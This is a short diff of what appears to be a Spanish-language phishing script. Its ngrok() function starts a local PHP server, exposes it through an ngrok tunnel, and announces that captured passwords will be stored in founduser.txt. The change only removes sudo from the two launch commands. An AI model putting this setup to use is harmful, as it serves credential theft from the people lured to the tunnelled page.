@@ -36,8 +36,8 @@ def link():
 
 
 def ngrok():
-    os.system("gnome-terminal -- sudo php -S localhost:8080")
-    os.system("gnome-terminal -- sudo ngrok http 8080")
+    os.system("gnome-terminal -- php -S localhost:8080")
+    os.system("gnome-terminal -- ngrok http 8080")
     clearConsole()
     contra()
     print("Las contraseñas estaran almacenadas en founduser.txt")
